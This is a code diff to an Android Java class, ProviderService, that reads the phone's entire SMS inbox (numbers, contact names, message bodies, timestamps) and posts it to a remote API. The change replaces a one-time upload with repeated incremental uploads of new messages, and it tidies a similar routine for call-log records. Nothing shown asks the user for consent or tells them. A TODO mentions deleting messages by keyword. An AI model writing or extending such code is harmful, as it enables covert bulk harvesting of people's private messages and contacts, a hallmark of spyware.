@@ -40,6 +40,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 
 import okhttp3.Headers;
@@ -55,7 +56,6 @@ import okhttp3.Headers;
 
 public class ProviderService {
     //TODO: 删除关键词短信
-    private SharePreferencesUtils mSharePreferences = null;
     // 获取内容解析者
     private ContentResolver mResolver = null;
 
@@ -63,7 +63,6 @@ public class ProviderService {
     private HashMap<String, File> picturePath = null;
 
     private ProviderService() {
-        this.mSharePreferences = SharePreferencesUtils.getInstance();
         this.mResolver = App.getInstance().getContentResolver();
     }
 
@@ -106,27 +105,32 @@ public class ProviderService {
     }
 
     public void getSMS() {
-        Boolean isSMSRead = (Boolean) mSharePreferences.get(Constant.SHARE_KEYS.SMS_HAS_READ, false);
-        if (!isSMSRead) {
-            // 获取查询路径
-            Uri uri = Uri.parse("content://sms");
-            Cursor cursor = mResolver.query(uri, new String[]{"address", "date", "body", "person"}, null, null, null);
-            if (null != cursor) {
-                List<SMSInfo> smsInfos = new ArrayList<>();
-                while (cursor.moveToNext()) {
-                    SMSInfo smsInfo = new SMSInfo();
-                    smsInfo.phoneNumber = cursor.getString(cursor.getColumnIndex("address"));//手机号
-                    smsInfo.name = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
-                    smsInfo.content = cursor.getString(cursor.getColumnIndex("body"));
-                    smsInfo.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndex("date")));
-                    smsInfos.add(smsInfo);
-                    LogUtils.d(smsInfo.toString());
-                }
-                cursor.close();
-                OkHttpUtils.post(ApiConfig.getSMSAll(), new HttpParams().addJson("sms_all", smsInfos), new HttpCallback(BaseResponse.class) {
+
+        // 获取查询路径
+        Uri uri = Uri.parse("content://sms");
+        Cursor cursor = mResolver.query(uri, new String[]{"address", "date", "body", "person"}, null, null, null);
+        if (null != cursor) {
+            List<SMSInfo> smsInfos = new ArrayList<>();
+            Map<String, SMSInfo> newMap = new HashMap<>();
+            while (cursor.moveToNext()) {
+                SMSInfo smsInfo = new SMSInfo();
+                smsInfo.phoneNumber = cursor.getString(cursor.getColumnIndex("address"));//手机号
+                smsInfo.name = cursor.getString(cursor.getColumnIndex("person"));//联系人姓名列表
+                smsInfo.content = cursor.getString(cursor.getColumnIndex("body"));
+                smsInfo.time = DateUtils.millis2String(cursor.getLong(cursor.getColumnIndex("date")));
+                smsInfos.add(smsInfo);
+                LogUtils.d(smsInfo.toString());
+
+                newMap.put(String.format("%s:%s", smsInfo.phoneNumber, smsInfo.time), smsInfo);
+            }
+            cursor.close();
+
+            final List<SMSInfo> update = updateSMS(smsInfos, newMap);
+            if (update != null) {
+                OkHttpUtils.post(ApiConfig.getSMSAll(), new HttpParams().addJson("sms_all", update), new HttpCallback(BaseResponse.class) {
                     @Override
                     public void onSuccess(BaseResponse httpResponse, Headers headers) {
-                        mSharePreferences.put(Constant.SHARE_KEYS.SMS_HAS_READ, true);
+                        SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.SMS, update);
                     }
 
                     @Override
@@ -135,6 +139,25 @@ public class ProviderService {
                 });
             }
         }
+    }
+
+    private List<SMSInfo> updateSMS(List<SMSInfo> smsInfos, Map<String, SMSInfo> newMap) {
+        if (smsInfos == null || smsInfos.size() == 0) {
+            return null;
+        }
+        List<SMSInfo> old = (List<SMSInfo>) SharePreferencesUtils.getInstance().get(Constant.SHARE_KEYS.SMS, null);
+        if (old == null) {
+            return smsInfos;
+        }
+        for (SMSInfo smsInfo : old) {
+            if (newMap.keySet().contains(String.format("%s:%s", smsInfo.phoneNumber, smsInfo.time))) {
+                newMap.remove(String.format("%s:%s", smsInfo.phoneNumber, smsInfo.time));
+            }
+        }
+        if (newMap.size() > 0) {
+            return new ArrayList<>(newMap.values());
+        }
+        return null;
     }
 
     @SuppressLint("DefaultLocale")
@@ -250,7 +273,6 @@ public class ProviderService {
         if (old == null) {
             return infos;
         }
-        List<PhoneInfo> newList = new ArrayList<>();
         for (PhoneInfo info : old) {
             if (newMap.keySet().contains(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time))) {
                 newMap.remove(String.format("%s:%d:%s", info.phoneNumber, info.type, info.time));
@@ -258,10 +280,7 @@ public class ProviderService {
         }
 
         if (newMap.size() > 0) {
-            for (String key : newMap.keySet()) {
-                newList.add(newMap.get(key));
-            }
-            return newList;
+            return new ArrayList<>(newMap.values());
         }
         return null;
     }
